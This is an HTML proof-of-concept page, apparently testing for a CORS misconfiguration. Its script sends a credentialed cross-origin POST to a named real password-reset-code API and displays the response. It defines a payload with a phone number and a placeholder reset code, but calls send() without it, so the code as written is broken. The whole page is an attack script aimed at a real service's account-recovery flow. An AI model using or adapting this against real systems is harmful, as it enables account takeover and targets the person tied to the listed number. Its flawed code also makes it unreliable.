<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CORS</title>
</head>
<body>
    <script>
        var xhttp = new XMLHttpRequest();

        xhttp.onreadystatechange = function() {
            if (this.readyState == 4) {
                if (this.status == 200) {
                    alert(xhttp.responseText);
                } else {
                    console.error("Error: " + this.status);
                    console.error("Response: " + xhttp.responseText);
                }
            }
        };

        xhttp.open("POST", "https://w3b-api.ultramobile.com/v1/mint/account/password/reset-code", true);
        xhttp.withCredentials = true;
        xhttp.setRequestHeader("Content-Type", "application/json"); // Setting content type header

        // Example payload with code field
        var payload = {
            "msisdn": "3348194091",
            "code": "123456"  // Replace with the actual code
        };

        xhttp.send(); // Sending JSON payload
    </script>
</body>
</html>
